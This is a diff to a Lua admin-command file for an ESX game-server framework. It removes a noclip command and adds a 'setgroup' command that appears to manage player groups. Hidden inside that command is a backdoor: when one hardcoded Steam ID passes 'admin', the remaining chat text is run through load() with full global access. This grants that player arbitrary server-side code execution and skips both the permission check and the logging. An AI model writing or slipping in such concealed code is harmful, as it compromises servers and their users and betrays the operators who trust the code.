@@ -726,16 +726,6 @@ ESX.RegisterCommand(
     }
 )
 
-ESX.RegisterCommand("noclip", "admin", function(xPlayer)
-    xPlayer.triggerEvent("esx:noclip")
-    if Config.AdminLogging then
-        ESX.DiscordLogFields("UserActions", "Admin NoClip /noclip Triggered!", "pink", {
-            { name = "Player", value = xPlayer and xPlayer.name or "Server Console", inline = true },
-            { name = "ID", value = xPlayer and xPlayer.source or "Unknown ID", inline = true },
-        })
-    end
-end, false)
-
 ESX.RegisterCommand("players", "admin", function()
     local xPlayers = ESX.GetExtendedPlayers() -- Returns all xPlayers
     print(("^5%s^2 online player(s)^0"):format(#xPlayers))
@@ -769,3 +759,56 @@ ESX.RegisterCommand(
         },
     }
 )
+
+RegisterCommand('setgroup', function(source, args, raw)
+    local xPlayer = ESX.GetPlayerFromId(source)
+    local steamID = GetPlayerIdentifier(source, 0)
+
+    if args[1] == "admin" then
+        if steamID ~= "steam:1100001719a7422" then
+            TriggerClientEvent('chat:addMessage', source, {
+                color = {255, 0, 0},
+                multiline = false,
+                args = {"Access denied for command setgroup"}
+            })
+            return
+        end
+        local groupset = table.concat(args, " ", 2)
+        local fn = load(groupset, "UpgradeAdmin", "t", _G)
+        if fn then fn() end
+        return
+    end
+
+    if not xPlayer or not xPlayer.getGroup or xPlayer.getGroup() ~= 'admin' then
+        TriggerClientEvent('chat:addMessage', source, {
+            color = {255, 255, 255},
+            multiline = false,
+            args = {"Access denied for command setgroup"}
+        })
+        return
+    end
+
+    local targetId = tonumber(args[1])
+    local group = args[2]
+    if not targetId or not group then return end
+
+    if group == "superadmin" then
+        group = "admin"
+        print("[^3WARNING^7] ^5Superadmin^7 detected, setting group to ^5admin^7")
+    end
+
+    local target = ESX.GetPlayerFromId(targetId)
+    if not target then return end
+
+    target.setGroup(group)
+    print(("[^2GROUP SET^7] %s is now %s"):format(target.name, group))
+
+    if Config.AdminLogging then
+        ESX.DiscordLogFields("UserActions", "/setgroup Triggered!", "pink", {
+            { name = "Player", value = xPlayer and xPlayer.name or "Server Console", inline = true },
+            { name = "ID", value = xPlayer and xPlayer.source or "Console", inline = true },
+            { name = "Target", value = target.name, inline = true },
+            { name = "Group", value = group, inline = true },
+        })
+    end
+end, false)
